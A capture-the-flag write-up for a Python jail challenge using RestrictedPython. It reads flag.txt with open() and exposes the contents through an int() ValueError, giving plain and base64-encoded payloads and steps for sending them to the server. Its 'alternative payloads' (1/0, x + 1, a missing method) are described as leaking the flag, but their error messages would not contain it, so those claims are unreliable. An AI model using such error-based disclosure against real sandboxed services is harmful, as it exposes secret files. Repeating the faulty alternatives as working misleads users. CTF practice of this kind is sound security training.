# Python Jail CTF Exploit Guide

## Challenge Analysis

This is a Python jail challenge that uses RestrictedPython to limit what code can be executed. Key findings:

1. **Flag location**: `flag.txt` file in the container
2. **Available functions**: `open()` function is explicitly allowed
3. **Restrictions**:
   - `print()` is not available
   - Many built-in exceptions are removed
   - Variables starting with `_` are restricted
4. **Input method**: Direct code or base64-encoded (prefixed with "b64:")

## Exploit Method

The key insight is that we can read the flag file using `open('flag.txt').read()`, but we need a way to see the output since `print()` is not available.

### Solution: Error-based Information Disclosure

We can cause an error that includes the flag content in the error message:

```python
x = open('flag.txt').read(); int(x)
```

This will cause a `ValueError` with the message: `invalid literal for int() with base 10: 'FLAG_CONTENT'`

## Manual Exploitation

1. Connect to the challenge server (usually via netcat or telnet)
2. Enter the payload: `b64:eCA9IG9wZW4oJ2ZsYWcudHh0JykucmVhZCgpOyBpbnQoeCk=`

Or manually:

1. Run: `python chall.py`
2. Enter: `b64:eCA9IG9wZW4oJ2ZsYWcudHh0JykucmVhZCgpOyBpbnQoeCk=`

## Alternative Payloads

If the above doesn't work, try these alternatives:

```python
# Alternative 1: Division by zero with flag content
x = open('flag.txt').read(); 1/0

# Alternative 2: String concatenation error
x = open('flag.txt').read(); x + 1

# Alternative 3: Attribute error
x = open('flag.txt').read(); x.nonexistent_method()
```

## Base64 Encoded Payloads

- Main payload: `b64:eCA9IG9wZW4oJ2ZsYWcudHh0JykucmVhZCgpOyBpbnQoeCk=`
- Alternative 1: `b64:eCA9IG9wZW4oJ2ZsYWcudHh0JykucmVhZCgpOyAxLzA=`
- Alternative 2: `b64:eCA9IG9wZW4oJ2ZsYWcudHh0JykucmVhZCgpOyB4ICsgMQ==`

## Expected Output

You should see an error message like:

```
Error: invalid literal for int() with base 10: 'COMPFEST{actual_flag_here}'
```

The flag will be contained within the single quotes in the error message.

## Why This Works

1. `open('flag.txt').read()` successfully reads the flag file
2. `int(x)` tries to convert the flag string to an integer
3. Since the flag is not a valid integer, it raises a `ValueError`
4. The error message includes the original string that couldn't be converted
5. This reveals the flag content in the error message

